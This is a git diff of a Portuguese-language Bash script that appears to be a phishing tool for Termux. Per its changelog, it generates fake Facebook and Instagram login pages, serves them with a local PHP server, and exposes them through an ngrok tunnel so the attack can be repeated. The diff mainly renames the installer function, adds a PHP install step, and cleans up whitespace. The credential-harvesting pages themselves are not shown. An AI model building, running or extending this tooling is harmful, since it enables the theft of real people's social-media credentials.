@@ -24,13 +24,13 @@
 #  Programa interrompido!
 #
 # Histórico:
-# 
+#
 # v0.1 2022-11-28, Oliver Silva;
 #     Adicionado suporte para facebook e instagram
 # v0.2 2023-01-05, Oliver Silva:
 #     Adicionado o comando JQ no lugar do GREP
 # v0.3 2023-01-07, Oliver Silva:
-#     Adicionado instalador Ngrok
+#     Adicionado instalador de requisitos caso necessário
 # v0.4 2023-01-08, Oliver Silva:
 #     Adicionado o loop while no lugar da recursão infinita evitando o bug 'Segmentation fault'
 # v0.5 2023-03-19, Adicionado suporte a repetição do ataque
@@ -39,7 +39,7 @@
 #
 # Versão 0.1: Gera páginas somente facebook e instagram
 # Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
-# Versão 0.3: Instalador Ngrok
+# Versão 0.3: Instalador de requisitos
 # Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
 # Versão 0.5: Repetição do ataque caso precise
 #
@@ -107,6 +107,7 @@ functionGroup() {
 }
 
 listenLocalhost() {
+    installReqIfNotExists
     php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
     sleep 3
 }
@@ -130,7 +131,7 @@ copyFiles() {
 tunnel() {
 
     if [ "$tunnel" == "ngrok" ] ; then
-	installNgrokIfNotExists
+	#installReqIfNotExists
         verifyProot
         ngrok http $port --log=stdout > /dev/null 2>&1 &
         sleep 3
@@ -155,7 +156,7 @@ showLink() {
 showLinkNgrok() {
     addr=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].config.addr")
     public=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].public_url")
- 
+
     verifyLinks $addr $public
 
     echo -e "\e[32m[+] Ngrok localhost: \e[33;1m$addr\e[0m"
@@ -248,14 +249,14 @@ list() {
     exit 0
 }
 
-installNgrokIfNotExists() {
+installReqIfNotExists() {
     arch=$(dpkg --print-architecture)
 
     if [ ! -f $PREFIX/bin/ngrok ] ; then
 	printf "\r\e[33;1m[*] Instalando Ngrok...\e[0m"
-	
+
 	curl -LO https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz > /dev/null 2>&1 &
-	
+
 	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
 	    printf "\r\e[33;1m[*] Instalando Ngrok..."
 	done
@@ -274,6 +275,14 @@ installNgrokIfNotExists() {
 	    apt install jq -y > /dev/null 2>&1
  	done
 	printf "\r\e[33;1m[+] Instalando Jq...\e[32;1mOK\e[0m\n"
+    fi
+
+    if [ ! -f $PREFIX/bin/php ] ; then
+	while [ ! -f $PREFIX/bin/php ] ; do
+	    printf "\r\e[33;1m[*] Instalando Php...\e[0m"
+	    apt install php -y > /dev/null 2>&1
+	done
+	printf "\r\e[33;1m[+] Instalando Php...\e[32;1mOK\e[0m\n"
     fi
 }
 
@@ -302,7 +311,7 @@ if [ -z "$1" ] ; then
     exit 1
 
 elif [ -n "$1" ] ; then
-    
+
     if [ ${#@} -gt 5 ] ; then
 	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mUltrapassou o limite de argumentos necessários\e[0m"
 	exit 1
@@ -323,19 +332,19 @@ while [ -n "$1" ] ; do
 		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mFaltou expecificar o serviço social\e[0m"
 		exit 1
 	    fi
-	
+
 	    serviceKey=1
 	    service="$1";;
 
 	-l|--listen) listenKey=1;;
 	-t|--tunnel)
 	    shift
-	
+
 	    if [ -z "$1" ] ; then
 		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mFaltou expecificar o tunnel\e[0m"
 		exit 1
 	    fi
-	    
+
 	    tunnelKey=1
 	    tunnel="$1"
 	    ;;
